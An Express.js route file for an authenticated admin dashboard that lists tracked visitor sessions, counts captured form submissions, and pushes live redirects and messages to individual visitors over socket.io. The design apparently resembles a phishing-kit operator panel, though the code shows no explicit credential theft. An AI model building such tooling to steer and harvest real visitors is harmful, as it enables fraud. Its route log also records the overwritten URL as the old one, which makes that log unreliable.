const express = require('express');
const router = express.Router();
const { Session, Trash, RouteLog } = require('../models');
const { authenticate } = require('../middleware');
const { v4: uuidv4 } = require('uuid');
const db = require('../db');

router.get('/stats/summary', authenticate, (req, res) => {
  try { const all = Session.find(); const now = new Date(); res.json({ live: all.filter(s => s.isLive && (now - new Date(s.lastActivity)) < 60000).length, mobile: all.filter(s => s.deviceType === 'Mobile').length, desktop: all.filter(s => s.deviceType === 'Desktop').length, submissions: all.filter(s => s.formData).length, total: all.length }); }
  catch (err) { res.status(500).json({ message: 'Server error' }); }
});
router.get('/', authenticate, (req, res) => {
  try { const sessions = Session.find(); res.json({ sessions, total: sessions.length }); }
  catch (err) { res.status(500).json({ message: 'Server error' }); }
});
router.get('/:id', authenticate, (req, res) => {
  try { const s = Session.findById(req.params.id); if (!s) return res.status(404).json({ message: 'Not found' }); res.json(s); }
  catch (err) { res.status(500).json({ message: 'Server error' }); }
});
router.delete('/:id', authenticate, (req, res) => {
  try { const s = Session.findById(req.params.id); if (!s) return res.status(404).json({ message: 'Not found' }); Trash.create({ trackingCode: s.trackingCode, originalId: s.visitorId, activity: s.status, systemData: { ip: s.ip, browser: s.browser } }); Session.findByIdAndDelete(req.params.id); res.json({ message: 'Moved to trash' }); }
  catch (err) { res.status(500).json({ message: 'Server error' }); }
});
router.post('/:id/redirect', authenticate, (req, res) => {
  try {
    const { targetUrl, message } = req.body;
    const all = db.sessions.read(); const i = all.findIndex(x => x._id === req.params.id);
    if (i === -1) return res.status(404).json({ message: 'Not found' });
    all[i].currentUrl = targetUrl; all[i].status = 'Redirected'; all[i].clicks = (all[i].clicks||0)+1; all[i].lastMessage = message || ''; all[i].lastActivity = new Date().toISOString();
    db.sessions.write(all);
    RouteLog.create({ visitorId: all[i].visitorId, changedBy: req.user._id, oldUrl: all[i].currentUrl || '', newUrl: targetUrl });
    const io = req.app.get('io');
    if (io) { io.emit('adminRedirect', { visitorId: all[i].visitorId, targetUrl }); if (message) io.emit('adminMessage', { trackingCode: all[i].trackingCode, message, targetUrl }); }
    res.json({ message: 'Redirect sent' });
  } catch (err) { res.status(500).json({ message: 'Server error' }); }
});
router.post('/:id/redirect-new', authenticate, (req, res) => {
  try { const { targetUrl } = req.body; const s = Session.findById(req.params.id); if (!s) return res.status(404).json({ message: 'Not found' }); const nv = uuidv4(); const dest = targetUrl || s.entryUrl || s.trackingCode || 'unknown'; const ns = Session.create({ trackingCode: s.trackingCode, visitorId: nv, ip: s.ip, browser: s.browser, deviceType: s.deviceType, status: 'Active', isLive: true, entryUrl: s.entryUrl || dest, currentUrl: dest, lastActivity: new Date().toISOString(), clicks: 0 }); res.json({ message: 'New session', session: ns }); }
  catch (err) { res.status(500).json({ message: 'Server error' }); }
});
module.exports = router;